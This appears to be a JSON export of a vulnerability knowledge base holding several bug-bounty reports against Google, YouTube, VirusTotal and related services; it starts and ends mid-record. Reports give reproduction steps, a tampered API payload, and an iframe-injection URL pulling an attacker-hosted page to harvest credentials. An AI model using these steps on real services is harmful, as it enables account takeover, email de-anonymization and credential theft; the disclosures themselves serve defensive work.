browser:\r\nhttps://www.virustotal.com/gui/account-activation/dmljdGltfHwxMTY1Njc1NDMyN3x8MzM1MmRjNzMxMTE1ZTliOTkzZGIyODY3ZjIyOTg0MmUxOGUyNTI3YWFmNDQ1ZjViYzkxYThmMGVlZDRjNWIxYw==\r\nAccount with username\r\n, email\r\nand password\r\nwill be successfully activated!\r\nThis bug leads to access to private enterprise groups, for example, I have tested that it is possible to get access to Kaspersky's enterprise group with email [REDACTED_EMAIL] and password [REDACTED_PASSWORD]. Be sure that I have not performed any violations with this account.\r\nAttack scenario\r\nAn attacker can use it to enumerate persons working in the company (enterprise group list), and for using quotas the company paid for, like downloading files or creating retrohunt rules. He can sell accounts with these wide permissions.\r\nIt will lead to complaints from your corporate users.", "mimetype": "text/plain", "start_char_idx": 0, "end_char_idx": 2138, "metadata_seperator": "\n", "text_template": "{metadata_str}\n\n{content}", "class_name": "TextNode"}, "__type__": "1"}, "c195a811-b220-4fd4-ab3e-f9a755a1e15b": {"__data__": {"id_": "c195a811-b220-4fd4-ab3e-f9a755a1e15b", "embedding": null, "metadata": {"file_path": "D:\\Users\\27928\\Desktop\\contest\\jzj_generate_agent\\data\\vuln_kb\\20250408_175724_195500.clean.txt", "file_name": "20250408_175724_195500.clean.txt", "file_type": "text/plain", "file_size": 1363, "creation_date": "2025-04-22", "last_modified_date": "2025-04-22"}, "excluded_embed_metadata_keys": ["file_name", "file_type", "file_size", "creation_date", "last_modified_date", "last_accessed_date"], "excluded_llm_metadata_keys": ["file_name", "file_type", "file_size", "creation_date", "last_modified_date", "last_accessed_date"], "relationships": {"1": {"node_id": "fabe0746-c7b5-4ad0-9524-01e25d290b44", "node_type": "4", "metadata": {"file_path": "D:\\Users\\27928\\Desktop\\contest\\jzj_generate_agent\\data\\vuln_kb\\20250408_175724_195500.clean.txt", "file_name": "20250408_175724_195500.clean.txt", "file_type": "text/plain", "file_size": 1363, "creation_date": "2025-04-22", "last_modified_date": "2025-04-22"}, "hash": "d2a92d6bfdb7491718a6cfe489c810d12526c8e9d7b6e8edbff98d7ac3923db8", "class_name": "RelatedNodeInfo"}}, "metadata_template": "{key}: {value}", "metadata_separator": "\n", "text": "Summary: YouTube Video Builder allows unauthorized upload to any YouTube channel\r\nSteps to reproduce:\r\nYouTube Video Builder allows the express creation and uploading of advertisements to YouTube. Users must first be given access to the tool at\r\nhttps://director.youtube.com/videobuilder/\r\n.\r\nOnce access is granted, use the tool to create any advertisement, render it, and then stop at step 3: upload (the screen with the \"Save video\" button).\r\nWhen you click \"Save video,\" the client makes a request to\r\nhttps://director.youtube.com/videobuilder/_/rpc/Image2VideoUiService/UploadToYouTube\r\n. In the form data of the request is a YouTube channel ID that looks something like this: UCxXX0xx_X0XxxXXxxxx00Xx\r\nModify the request and send it with the ID of a channel that is not owned by the user. The server returns no error and the video is uploaded, unlisted, to the channel without issue. The video ID is included in the server's response.\r\nBrowser/OS: Ubuntu 20.04, Chrome dev 85.0.4173.0\r\nAttack scenario:\r\nAny regular user could use this to upload a video with no limits to any YouTube channel. This includes channels with massive influence, and even though the video is unlisted, it can still be seen by the creator and anyone with the link. It would be possible to, for example, upload and share a potentially harmful video to a channel and defame the user.", "mimetype": "text/plain", "start_char_idx": 0, "end_char_idx": 1363, "metadata_seperator": "\n", "text_template": "{metadata_str}\n\n{content}", "class_name": "TextNode"}, "__type__": "1"}, "da2f1661-a764-4415-a56e-e5db904d4bf9": {"__data__": {"id_": "da2f1661-a764-4415-a56e-e5db904d4bf9", "embedding": null, "metadata": {"file_path": "D:\\Users\\27928\\Desktop\\contest\\jzj_generate_agent\\data\\vuln_kb\\20250408_172348_641657.clean.txt", "file_name": "20250408_172348_641657.clean.txt", "file_type": "text/plain", "file_size": 4376, "creation_date": "2025-04-22", "last_modified_date": "2025-04-22"}, "excluded_embed_metadata_keys": ["file_name", "file_type", "file_size", "creation_date", "last_modified_date", "last_accessed_date"], "excluded_llm_metadata_keys": ["file_name", "file_type", "file_size", "creation_date", "last_modified_date", "last_accessed_date"], "relationships": {"1": {"node_id": "f3663b85-5137-4845-bbe4-90a3e9dc0763", "node_type": "4", "metadata": {"file_path": "D:\\Users\\27928\\Desktop\\contest\\jzj_generate_agent\\data\\vuln_kb\\20250408_172348_641657.clean.txt", "file_name": "20250408_172348_641657.clean.txt", "file_type": "text/plain", "file_size": 4376, "creation_date": "2025-04-22", "last_modified_date": "2025-04-22"}, "hash": "2aa96f04cc6ea7f511f4872a8b5854f84b86369bf2e14f9954985f9ecfa71de1", "class_name": "RelatedNodeInfo"}, "3": {"node_id": "1ca6ec9c-711c-4505-aac1-7636f2ade225", "node_type": "1", "metadata": {}, "hash": "46883a42b29977358166896a3384f44653d67d0da22eb0709c723d7bb3a5826b", "class_name": "RelatedNodeInfo"}}, "metadata_template": "{key}: {value}", "metadata_separator": "\n", "text": "Summary:\r\nAccess control issue in /get_creator_channels leaks channel contentOwnerAssociation, which leads to channel email address disclosure via Content ID API\r\nProgram:\r\nGoogle VRP\r\nURL:\r\nhttps://www.youtube.com\r\nVulnerability type:\r\nPermissions Bypass\r\nDetails\r\nAccess control bug in\r\nstudio.youtube.com/youtubei/v1/creator/get_creator_channels\r\nleaks a channel's associated\r\ncontentOwnerId\r\n. This\r\ncan then be used in the\r\nContent ID API\r\nvia\r\ncontentOwners.list\r\nto leak the channel's email address at the time it joined the YouTube Partner Program.\r\nImpact:\r\nThe disclosure of the email address of channels in the YouTube Partner Program (YPP), including timestamps on when they first joined and last joined YPP.\r\nCore Issues\r\nThe\r\ncontentOwnerAssociation\r\nof a channel is leaked from\r\nincludeSuspended: true\r\nEven though the YouTube Content ID API is only supposed to be accessible by users with a Content Manager account, it's possible to use the API authenticated with a Google account that was tied to a channel during the time the channel joined the YouTube Partner Program\r\nPre-requisites\r\nAccess to a Google account that was tied to a channel during the time the channel join the YouTube Partner Program (required to leak the email address with a\r\n)\r\nSteps to reproduce:\r\nSign into a Google account with a YouTube channel\r\nVisit\r\nhttps://studio.youtube.com\r\nOpen DevTools > Network\r\nClick the \"Earn\" tab on the YouTube Studio\r\nA request to\r\nPOST /youtubei/v1/creator/get_creator_channels?alt=json\r\nshould be seen\r\nModify the request payload to this request to look as such:\r\n{\r\n\"context\": {\r\n...\r\n},\r\n\"channelIds\": [\r\n\"[REDACTED_ID]\"\r\n],\r\n\"mask\": {\r\n\"channelId\": true,\r\n\"title\": true\r\n\"includeSuspended\": true\r\n}\r\nReplace the channel ID in\r\nchannelIds\r\nwith your victim channel ID.\r\nNote,\r\nshould not be in the\r\nmask\r\neven though this is what we are leaking. This is because there's a correct access control check  on the mask, but\r\noverrides the response data to include the\r\neven if we aren't authorized to view it.\r\nSend the request and the response should look as such:\r\n\"channels\": [\r\n\"channelId\": \"[REDACTED_ID]\",\r\n\"title\": \"[REDACTED_TITLE]\",\r\n\"responseStatus\": {\r\n\"statusCode\": \"CREATOR_ENTITY_STATUS_OK\"\r\n\"contentOwnerAssociation\": {\r\n\"externalContentOwnerId\": \"[REDACTED_ID]\",\r\n\"createTime\": {\r\n\"seconds\": \"1362270100\"\r\n\"permissions\": {\r\n\"canWebClaim\": true,\r\n\"canViewRevenue\": true,\r\n\"canEnableCid\": false\r\n\"isDefaultChannel\": true,\r\n\"activateTime\": {\r\n\"seconds\": \"1637070104\",\r\n\"nanos\": 959438638\r\n]\r\nThe target's content owner ID is\r\n[REDACTED_ID]\r\n, the unix timestamp they first joined YouTube Partner Program (YPP) is\r\n1362270100\r\nand they last joined at\r\n1637070104\r\nFor channels in a Content Manager (CMS), the\r\npermissions\r\nwould be the permissions granted to the channel by the Content Manager.\r\nSign into a Google account that was tied with a channel when a channel first joined the YouTube Partner Program\r\nIf necessary, you can refer to the attached video for the following steps\r\nhttps://developers.google.com/youtube/partner/reference/rest/v1/contentOwners/list\r\nClick \"Try it!\" on the Explorer on the right side. Enter the\r\nin the\r\nid\r\nbox. Ensure that Google OAuth 2.0 is checked.\r\nClick \"Execute\", and you would have the target's email address:\r\n\"kind\": \"youtubePartner#contentOwner\",\r\n\"items\": [\r\n\"id\": \"[REDACTED_ID]\",\r\n\"displayName\": \"[REDACTED_USERNAME]\",\r\n\"conflictNotificationEmail\": \"[REDACTED_EMAIL]\"\r\ndisplayName\r\nis the channel's display name at the time it was monetized.\r\nAdditional notes:\r\nWhile it may initially sound intentional due to the use of the name\r\npartner\r\n, channels in the YouTube Partner Program (YPP) are not supposed to be able to use the Content ID API. This is why the option to enable the Content ID API for a project in\r\nhttps://cloud.google.com\r\ndoesn't show for Google accounts tied to a YPP channel. However, for whatever reason, the endpoint still works via the \"Try it!\" functionality of the API explorer.\r\nAttack scenario\r\nAn attacker with access to a Google account that had a channel that joined the YouTube Partner Program (over 3 million channels) can obtain the email address as well as monetization details of any other channel in the YouTube Partner Program.", "mimetype": "text/plain", "start_char_idx": 0, "end_char_idx": 4247, "metadata_seperator": "\n", "text_template": "{metadata_str}\n\n{content}", "class_name": "TextNode"}, "__type__": "1"}, "1ca6ec9c-711c-4505-aac1-7636f2ade225": {"__data__": {"id_": "1ca6ec9c-711c-4505-aac1-7636f2ade225", "embedding": null, "metadata": {"file_path": "D:\\Users\\27928\\Desktop\\contest\\jzj_generate_agent\\data\\vuln_kb\\20250408_172348_641657.clean.txt", "file_name": "20250408_172348_641657.clean.txt", "file_type": "text/plain", "file_size": 4376, "creation_date": "2025-04-22", "last_modified_date": "2025-04-22"}, "excluded_embed_metadata_keys": ["file_name", "file_type", "file_size", "creation_date", "last_modified_date", "last_accessed_date"], "excluded_llm_metadata_keys": ["file_name", "file_type", "file_size", "creation_date", "last_modified_date", "last_accessed_date"], "relationships": {"1": {"node_id": "f3663b85-5137-4845-bbe4-90a3e9dc0763", "node_type": "4", "metadata": {"file_path": "D:\\Users\\27928\\Desktop\\contest\\jzj_generate_agent\\data\\vuln_kb\\20250408_172348_641657.clean.txt", "file_name": "20250408_172348_641657.clean.txt", "file_type": "text/plain", "file_size": 4376, "creation_date": "2025-04-22", "last_modified_date": "2025-04-22"}, "hash": "2aa96f04cc6ea7f511f4872a8b5854f84b86369bf2e14f9954985f9ecfa71de1", "class_name": "RelatedNodeInfo"}, "2": {"node_id": "da2f1661-a764-4415-a56e-e5db904d4bf9", "node_type": "1", "metadata": {"file_path": "D:\\Users\\27928\\Desktop\\contest\\jzj_generate_agent\\data\\vuln_kb\\20250408_172348_641657.clean.txt", "file_name": "20250408_172348_641657.clean.txt", "file_type": "text/plain", "file_size": 4376, "creation_date": "2025-04-22", "last_modified_date": "2025-04-22"}, "hash": "06faab186502cef3123d11473d7603b9aadc5bc37c9acd78d8a6651c68f2ecbf", "class_name": "RelatedNodeInfo"}}, "metadata_template": "{key}: {value}", "metadata_separator": "\n", "text": "Additional notes:\r\nWhile it may initially sound intentional due to the use of the name\r\npartner\r\n, channels in the YouTube Partner Program (YPP) are not supposed to be able to use the Content ID API. This is why the option to enable the Content ID API for a project in\r\nhttps://cloud.google.com\r\ndoesn't show for Google accounts tied to a YPP channel. However, for whatever reason, the endpoint still works via the \"Try it!\" functionality of the API explorer.\r\nAttack scenario\r\nAn attacker with access to a Google account that had a channel that joined the YouTube Partner Program (over 3 million channels) can obtain the email address as well as monetization details of any other channel in the YouTube Partner Program. The attacker can use this to de-anonymize a YouTuber (as there is an expectation of pseudo-anonymity in YouTube), or phish them.", "mimetype": "text/plain", "start_char_idx": 3527, "end_char_idx": 4376, "metadata_seperator": "\n", "text_template": "{metadata_str}\n\n{content}", "class_name": "TextNode"}, "__type__": "1"}, "2dffab20-ff3a-46d7-94d1-57126b28fef6": {"__data__": {"id_": "2dffab20-ff3a-46d7-94d1-57126b28fef6", "embedding": null, "metadata": {"file_path": "D:\\Users\\27928\\Desktop\\contest\\jzj_generate_agent\\data\\vuln_kb\\20250408_175656_554567.clean.txt", "file_name": "20250408_175656_554567.clean.txt", "file_type": "text/plain", "file_size": 4879, "creation_date": "2025-04-22", "last_modified_date": "2025-04-22"}, "excluded_embed_metadata_keys": ["file_name", "file_type", "file_size", "creation_date", "last_modified_date", "last_accessed_date"], "excluded_llm_metadata_keys": ["file_name", "file_type", "file_size", "creation_date", "last_modified_date", "last_accessed_date"], "relationships": {"1": {"node_id": "f3ca6dc3-cce7-4adb-8203-eecc5a27fed3", "node_type": "4", "metadata": {"file_path": "D:\\Users\\27928\\Desktop\\contest\\jzj_generate_agent\\data\\vuln_kb\\20250408_175656_554567.clean.txt", "file_name": "20250408_175656_554567.clean.txt", "file_type": "text/plain", "file_size": 4879, "creation_date": "2025-04-22", "last_modified_date": "2025-04-22"}, "hash": "e53a0f419f3e1406594e99fde1933e6b37c709efc15e5d4d474baafebe19880f", "class_name": "RelatedNodeInfo"}, "3": {"node_id": "13c72b01-50e9-433b-a555-c6e0772fc3f5", "node_type": "1", "metadata": {}, "hash": "0f8d7d93e1f525ba7e2c1d219da84a66acef6a7635bf833037359340197efa69", "class_name": "RelatedNodeInfo"}}, "metadata_template": "{key}: {value}", "metadata_separator": "\n", "text": "Summary:\r\nGoogle OAuth2 Login CSRF Vulnerability in Google Cloud Eclipse IDE Plugin\r\nProduct:\r\nGoogle Cloud\r\nURL:\r\nhttps://github.com/GoogleCloudPlatform/google-cloud-eclipse/blob/4d213f59421f7d28aab17e336a248713fc97f1fa/plugins/com.google.cloud.tools.eclipse.login/src/com/google/cloud/tools/eclipse/login/GoogleLoginService.java#L64\r\nVulnerability type:\r\nCross-site request forgery (CSRF)\r\nDetails\r\nThe official \"Google Cloud Tools for Eclipse\" IDE plugin, referenced\r\nhere\r\n,  is vulnerable to a Google OAuth2 Login CSRF attack. As part of the plugin setup process, users are prompted to follow a Google OAuth2 flow to authorize the plugin to access the user's email and perform actions on their Google Cloud account.\r\nWhen the user initiates the authorization flow, they are redirected to a browser page similar to this:\r\nhttps://accounts.google.com/o/oauth2/auth?client_id=572124029240-i0vhlk5ibeqbufl5e56ttdbs20ucj2k1.apps.googleusercontent.com&redirect_uri=http://localhost:49790/Callback&response_type=code&scope=email%20https://www.googleapis.com/auth/cloud-platform\r\nNote that the URL above does not include the \"state\" parameter which is used to prevent CSRF attacks as described\r\n.\r\nThe plugin exposes this vulnerability in its insecure use of the \"GoogleAuthorizationCodeRequestUrl\" method in the\r\nGoogleLoginService.java\r\nclass:\r\npublic static String\r\ngetGoogleLoginUrl\r\n(String redirectUrl) {\r\nreturn new\r\nGoogleAuthorizationCodeRequestUrl\r\n(Constants.getOAuthClientId(), redirectUrl,\r\nOAUTH_SCOPES).toString();\r\n}\r\nAnother aspect of this implementation that makes it more easily exploitable is the fact that the plugin creates a local HTTP server that listens on all network interfaces. This is the server that receives the callback with the authorization code after the user connects their user accounts (redirect_uri from the URL above).\r\nThe vulnerable creation of the HTTP server comes from the use of the getRedirectUri() method in\r\nLocalServerReceiver.java\r\npublic String\r\ngetRedirectUri\r\n() throws IOException {\r\nserver =\r\nHttpServer.create(new InetSocketAddress(port != -1 ? port : findOpenPort()), 0);\r\nHttpContext context = server.createContext(callbackPath, new CallbackHandler());\r\nserver.setExecutor(null);\r\ntry {\r\nserver.start();\r\nport = server.getAddress().getPort();\r\n} catch (Exception e) {\r\nThrowables.propagateIfPossible(e);\r\nthrow new IOException(e);\r\nreturn \"http://\" + this.getHost() + \":\" + port + callbackPath;\r\nWhere the getRedirectUri method and  getGoogleLoginUrl get directly invoked in\r\nLoginServiceUi.java\r\nas follows:\r\npublic VerificationCodeHolder\r\nobtainVerificationCodeFromExternalUserInteraction\r\n(String message) {\r\nLocalServerReceiver\r\ncodeReceiver = createLocalServerReceiver\r\n();\r\nString\r\nredirectUrl = codeReceiver.getRedirectUri\r\nif (!Program.launch(GoogleLoginService.\r\n(redirectUrl))) {\r\nshowErrorDialogHelper(\r\nMessages.getString(\"LOGIN_ERROR_DIALOG_TITLE\"),\r\nMessages.getString(\"LOGIN_ERROR_CANNOT_OPEN_BROWSER\"));\r\nreturn null;\r\nString authorizationCode = showProgressDialogAndWaitForCode(codeReceiver);\r\nif (authorizationCode != null) {\r\nAnalyticsPingManager.getInstance().sendPingOnShell(shellProvider.getShell(),\r\nAnalyticsEvents.LOGIN_SUCCESS);\r\nreturn new VerificationCodeHolder(authorizationCode, redirectUrl);\r\nFrom\r\nThe attack scenario is as follows:\r\nA would-be attacker, with a target user in mind, would create a Google account resembling that of the user (same profile pic, similar email spelling...).\r\nThe attacker would create a program that would either directly call the IP of the targeted user (if they are in the same LAN as the plugin user or the user's machine is exposed to the internet) or they would craft an HTML page that the user would unsuspectingly browse to.\r\nTo identify the port that the server is listening on, the attacker would perform a port scan against the machine which can be performed either remotely or via JavaScript in the HTML page in the browser.\r\nOnce the callback URL is fully identified, the attacker would make a request to it with the authorization code belonging to the counterfeit account they created.\r\nThe user's IDE would be logged in as the counterfeit account and would perform actions against that account\r\nAttack scenario\r\nA would-be attacker situated on the internet or in the same LAN as the targeted victim would be able to call the callback endpoint with their own authorization code (redirect_uri above). With a targeted attack, the attacker would create a Google account that is almost indistinguishable from the victim's (same profile pic, similar email address spelling...).\r\nAn unsuspecting user would then use the plugin as intended and the consequence would be that they would deploy their apps to the account under the attacker's control.", "mimetype": "text/plain", "start_char_idx": 0, "end_char_idx": 4771, "metadata_seperator": "\n", "text_template": "{metadata_str}\n\n{content}", "class_name": "TextNode"}, "__type__": "1"}, "13c72b01-50e9-433b-a555-c6e0772fc3f5": {"__data__": {"id_": "13c72b01-50e9-433b-a555-c6e0772fc3f5", "embedding": null, "metadata": {"file_path": "D:\\Users\\27928\\Desktop\\contest\\jzj_generate_agent\\data\\vuln_kb\\20250408_175656_554567.clean.txt", "file_name": "20250408_175656_554567.clean.txt", "file_type": "text/plain", "file_size": 4879, "creation_date": "2025-04-22", "last_modified_date": "2025-04-22"}, "excluded_embed_metadata_keys": ["file_name", "file_type", "file_size", "creation_date", "last_modified_date", "last_accessed_date"], "excluded_llm_metadata_keys": ["file_name", "file_type", "file_size", "creation_date", "last_modified_date", "last_accessed_date"], "relationships": {"1": {"node_id": "f3ca6dc3-cce7-4adb-8203-eecc5a27fed3", "node_type": "4", "metadata": {"file_path": "D:\\Users\\27928\\Desktop\\contest\\jzj_generate_agent\\data\\vuln_kb\\20250408_175656_554567.clean.txt", "file_name": "20250408_175656_554567.clean.txt", "file_type": "text/plain", "file_size": 4879, "creation_date": "2025-04-22", "last_modified_date": "2025-04-22"}, "hash": "e53a0f419f3e1406594e99fde1933e6b37c709efc15e5d4d474baafebe19880f", "class_name": "RelatedNodeInfo"}, "2": {"node_id": "2dffab20-ff3a-46d7-94d1-57126b28fef6", "node_type": "1", "metadata": {"file_path": "D:\\Users\\27928\\Desktop\\contest\\jzj_generate_agent\\data\\vuln_kb\\20250408_175656_554567.clean.txt", "file_name": "20250408_175656_554567.clean.txt", "file_type": "text/plain", "file_size": 4879, "creation_date": "2025-04-22", "last_modified_date": "2025-04-22"}, "hash": "4d191ce6ed7118c71ef9fe88796cee305532c1c0235b8d38b376becda802e3fa", "class_name": "RelatedNodeInfo"}}, "metadata_template": "{key}: {value}", "metadata_separator": "\n", "text": "To identify the port that the server is listening on, the attacker would perform a port scan against the machine which can be performed either remotely or via JavaScript in the HTML page in the browser.\r\nOnce the callback URL is fully identified, the attacker would make a request to it with the authorization code belonging to the counterfeit account they created.\r\nThe user's IDE would be logged in as the counterfeit account and would perform actions against that account\r\nAttack scenario\r\nA would-be attacker situated on the internet or in the same LAN as the targeted victim would be able to call the callback endpoint with their own authorization code (redirect_uri above). With a targeted attack, the attacker would create a Google account that is almost indistinguishable from the victim's (same profile pic, similar email address spelling...).\r\nAn unsuspecting user would then use the plugin as intended and the consequence would be that they would deploy their apps to the account under the attacker's control. This would lead to the leak of confidential source code, and other sensitive secrets deployed with the app.", "mimetype": "text/plain", "start_char_idx": 3751, "end_char_idx": 4879, "metadata_seperator": "\n", "text_template": "{metadata_str}\n\n{content}", "class_name": "TextNode"}, "__type__": "1"}, "7d218378-32e1-4938-ab0f-a8a16f90573e": {"__data__": {"id_": "7d218378-32e1-4938-ab0f-a8a16f90573e", "embedding": null, "metadata": {"file_path": "D:\\Users\\27928\\Desktop\\contest\\jzj_generate_agent\\data\\vuln_kb\\20250408_175714_999098.clean.txt", "file_name": "20250408_175714_999098.clean.txt", "file_type": "text/plain", "file_size": 1938, "creation_date": "2025-04-22", "last_modified_date": "2025-04-22"}, "excluded_embed_metadata_keys": ["file_name", "file_type", "file_size", "creation_date", "last_modified_date", "last_accessed_date"], "excluded_llm_metadata_keys": ["file_name", "file_type", "file_size", "creation_date", "last_modified_date", "last_accessed_date"], "relationships": {"1": {"node_id": "85fb8769-c8f9-48d3-9bc9-e329fcd1e4bd", "node_type": "4", "metadata": {"file_path": "D:\\Users\\27928\\Desktop\\contest\\jzj_generate_agent\\data\\vuln_kb\\20250408_175714_999098.clean.txt", "file_name": "20250408_175714_999098.clean.txt", "file_type": "text/plain", "file_size": 1938, "creation_date": "2025-04-22", "last_modified_date": "2025-04-22"}, "hash": "b4bf2708991d8b6e7f8a9f7cae26fbdf2d2914002b0c7d69a8ae609f539d9187", "class_name": "RelatedNodeInfo"}}, "metadata_template": "{key}: {value}", "metadata_separator": "\n", "text": "Summary:\r\nOnsite Iframe injection at Customer support page leads to harvest user problems & credentials\r\nProduct:\r\nAppsheet\r\nURL:\r\nhttps://www.appsheet.com/Support\r\nVulnerability type:\r\nOther\r\nDetails\r\nHi, Team this vulnerability was found in Appsheet which is the acquisition of Google, Acquired on Jan 15, 2020\r\nVulnerability\r\n: Onsite Iframe injection at Customer support page leads to harvest user problems & credentials\r\nDescription\r\n:  An iFrame injection is a very common cross-site scripting (or XSS) attack. It consists of one or more iFrame tags that have been inserted into a page or post\u2019s content and typically downloads an executable program or conducts other actions that compromise the site visitors\u2019 computers. In the best case, Google may label the site \u201cmalicious.\u201d The worst case is that the site owner and visitors end up with malware-infected computers.\r\nframe injection, which occurs when a frame on a vulnerable web page displays another web page via a user-controllable input.\r\nSteps to Reproduce\r\n:\r\nI Have hosted a malicious code in my server i.e\r\nhttps://www.basubanakar.com/con.html\r\nNow By using html injection vulnerability on Appsheet main domain i.e on customer support page , I will call my malicious code using html injection or iframe injection. ex:  Here vulnerable parameter is \"dFR[doc_type][0]=\" Now as an attacker I will craft that url as:\r\nhttps://www.appsheet.com/Support?q=%20&dFR[doc_type][0]=%3Ciframe%20src=%22https://www.basubanakar.com/con.html%22%20width=1200%20height=1000%20/%3E\r\nNow when victim opens this links I am getting his creds etc by using form.\r\nProof of concept\r\n:  See this Below video\r\nhttps://drive.google.com/file/d/1xNCq3yxVkzhm4MKzg0_yFtYcSO4XVWZl/view?usp=sharing\r\nAttack scenario\r\nAny attacker can exploit this vulnerability because its present mainly on Customer support page\r\nwhere he can inject his own contact form and he can harvest victim creds by that.", "mimetype": "text/plain", "start_char_idx": 0, "end_char_idx": 1930, "metadata_seperator": "\n", "text_template": "{metadata_str}\n\n{content}", "class_name": "TextNode"}, "__type__": "1"}, "fd82a32f-a572-4634-9dce-509f67d2344e": {"__data__": {"id_": "fd82a32f-a572-4634-9dce-509f67d2344e", "embedding": null, "metadata": {"file_path": "D:\\Users\\27928\\Desktop\\contest\\jzj_generate_agent\\data\\vuln_kb\\20250408_175705_828683.clean.txt", "file_name": "20250408_175705_828683.clean.txt", "file_type": "text/plain", "file_size": 1961, "creation_date": "2025-04-22", "last_modified_date": "2025-04-22"}, "excluded_embed_metadata_keys": ["file_name", "file_type", "file_size", "creation_date", "last_modified_date", "last_accessed_date"], "excluded_llm_metadata_keys": ["file_name", "file_type", "file_size", "creation_date", "last_modified_date", "last_accessed_date"], "relationships": {"1": {"node_id": "1710b53c-fee7-445f-a938-f42b41ae985e", "node_type": "4", "metadata": {"file_path": "D:\\Users\\27928\\Desktop\\contest\\jzj_generate_agent\\data\\vuln_kb\\20250408_175705_828683.clean.txt", "file_name": "20250408_175705_828683.clean.txt", "file_type": "text/plain", "file_size": 1961, "creation_date": "2025-04-22", "last_modified_date": "2025-04-22"}, "hash": "5b15bdd4f3113e855c55dd9c88ddee7e511ecefb14fd82315ada9c0b952ace0d", "class_name": "RelatedNodeInfo"}}, "metadata_template": "{key}: {value}", "metadata_separator": "\n", "text": "Summary:\r\nInjecting Google Tag Manager inside Google Sites (sites.google.com) (should not be possible)\r\nProduct:\r\nGoogle Sites (sites.google.com)\r\nURL:\r\nhttps://sites.google.com\r\nVulnerability type:\r\nPermissions Bypass\r\nDetails\r\nIn Google Sites the validation if the value is a valid Google Analytics account id is being made only in the frontend site, not in the backend. So, by changing the javascript function it is possible to send any string as a Google Analytics id, it is then saved and populated in the html of the pages hosted in the domain sites.google.com.\r\nAs Google Analytics (GA) and Google Tag Manager (GTM) are both served by the same server (\r\nhttps://www.googletagmanager.com/gtag/js?id=XXXXXXX\r\n), when someone sends a GTM id instead of GA id then the GTM will be successfully loaded in the site.\r\nAttached are the steps to reproduce the bug.\r\nHere is a demo site loading GTM instead of GA. And to prove it is working I'm running GA from inside this GTM:\r\nhttps://sites.google.com/view/gtm-in-g00gle-sites/home\r\nAttack scenario\r\nGoogle Tag Manager is a Javascript hosting tool that allows developers to update tags (scripts) without changing anything in the site server side. Inside GTM, Javascript tags can be created by filling out forms, for example, with a Google Analytics id, and also by inputting raw Javascript.\r\nGoogle Sites allow users to insert Javascript in the HTML by encapsulating it into nested iframes to avoid security problems (\"Embed code\" feature in Google Sites). But by tricking Google Sites into loading GTM outside iframes, in the main html of a site in a subdomain of \"google.com\", it opens itself to different kinds of attacks, mainly cross-site scripting and forgery.\r\nI did not explored this but it looks to me that with some creativity it would be possible to take over a Google Account and/or leak information of a user that visited an site hosted in sites.google.com with malicious code created using this bug.", "mimetype": "text/plain", "start_char_idx": 0, "end_char_idx": 1961, "metadata_seperator": "\n", "text_template": "{metadata_str}\n\n{content}", "class_name": "TextNode"}, "__type__": "1"}, "fb074159-8e79-414b-b3a2-c5e517d96c3a": {"__data__": {"id_": "fb074159-8e79-414b-b3a2-c5e517d96c3a", "embedding": null, "metadata": {"file_path": "D:\\Users\\27928\\Desktop\\contest\\jzj_generate_agent\\data\\vuln_kb\\20250408_175726_492824.clean.txt", "file_name": "20250408_175726_492824.clean.txt", "file_type": "text/plain", "file_size": 0, "creation_date": "2025-04-22", "last_modified_date": "2025-04-22"}, "excluded_embed_metadata_keys": ["file_name", "file_type", "file_size", "creation_date", "last_modified_date", "last_accessed_date"], "excluded_llm_metadata_keys": ["file_name", "file_type", "file_size", "creation_date", "last_modified_date", "last_accessed_date"], "relationships": {"1": {"node_id": "0c76be20-2cad-4010-a0be-87089d1f295f", "node_type": "4", "metadata": {"file_path": "D:\\Users\\27928\\Desktop\\contest\\jzj_generate_agent\\data\\vuln_kb\\20250408_175726_492824.clean.txt", "file_name": "20250408_175726_492824.clean.txt", "file_type": "text/plain", "file_size": 0, "creation_date": "2025-04-22", "last_modified_date": "2025-04-22"}, "hash": "9a3719416738727853ddef493bc7a6aa233f880a9b9715cc6d830768b96747c4", "class_name": "RelatedNodeInfo"}}, "metadata_template": "{key}: {value}", "metadata_separator": "\n", "text": "", "mimetype": "text/plain", "start_char_idx": 0, "end_char_idx": 0, "metadata_seperator": "\n", "text_template": "{metadata_str}\n\n{content}", "class_name": "TextNode"}, "__type__": "1"}, "d029ffa9-2011-4759-8cb7-9f05ee95098e": {"__data__": {"id_": "d029ffa9-2011-4759-8cb7-9f05ee95098e", "embedding": null, "metadata": {"file_path": "D:\\Users\\27928\\Desktop\\contest\\jzj_generate_agent\\data\\vuln_kb\\20250408_175733_359392.clean.txt", "file_name": "20250408_175733_359392.clean.txt", "file_type": "text/plain", "file_size": 1814, "creation_date": "2025-04-22", "last_modified_date": "2025-04-22"}, "excluded_embed_metadata_keys": ["file_name", "file_type", "file_size", "creation_date", "last_modified_date", "last_accessed_date"], "excluded_llm_metadata_keys": ["file_name", "file_type", "file_size", "creation_date", "last_modified_date", "last_accessed_date"], "relationships": {"1": {"node_id": "d1a443ae-1964-49cc-9c2e-bbdc19ae7674", "node_type": "4", "metadata": {"file_path": "D:\\Users\\27928\\Desktop\\contest\\jzj_generate_agent\\data\\vuln_kb\\20250408_175733_359392.clean.txt", "file_name": "20250408_175733_359392.clean.txt", "file_type": "text/plain", "file_size": 1814, "creation_date": "2025-04-22", "last_modified_date": "2025-04-22"}, "hash": "165a29ca60783b63a0de49c2063758a2c17589d26694cf9aee44e29ac6f8f4e9", "class_name": "RelatedNodeInfo"}}, "metadata_template": "{key}: {value}", "metadata_separator": "\n", "text": "Summary: The library allows an advertiser to ask discoverers to associate with an arbitray access point and overwrite default routes, capturing all traffic from the discoverer\r\nSteps to reproduce:\r\nThe strategy is P2P_STAR\r\nAttacker controls a malicious advertiser and an (Internet connected) access point\r\nThe victim discoverer connects to the advertiser over Bluetooth\r\nThe advertiser asks the discoverer to switch to WiFi, providing essid and password to own access point.\r\nThe discoverer associates to AP, gets default route via DCHP pointing to attacker system\r\nAll Internet bound traffic from discoverer (not only nearby related) is now sent to attacker without user noticing\r\nBrowser/OS: Android and Android Things versions supporting the Nearby\r\nConnections API. In the future potentially also iOS\r\nAttack scenario:\r\nSetup: victim discoverer looks for an advertiser (using the P2P_STAR strategy). An attacker in proximity responds, impersonating the wanted advertiser. Victim discoverer accepts/establishes connection, believing this to be the wanted advertiser. Attacker then initiates switch to WiFi link, victim automatically (without user interaction) associates to the attacker AP, using default route from attacker's DHCP response. All victim IPv4 traffic now is routed by its OS via the access point of the attacker.\r\nAs a result, the attacker is now able to monitor and tamper with all traffic coming from the victim. The traffic includes the packets generated by other applications that are not using the library, yet they require Internet access such as email clients, web browsers, cloud services. We understand that most of such traffic is are secured with TLS, but we believe that this attack is\r\nstill serious, 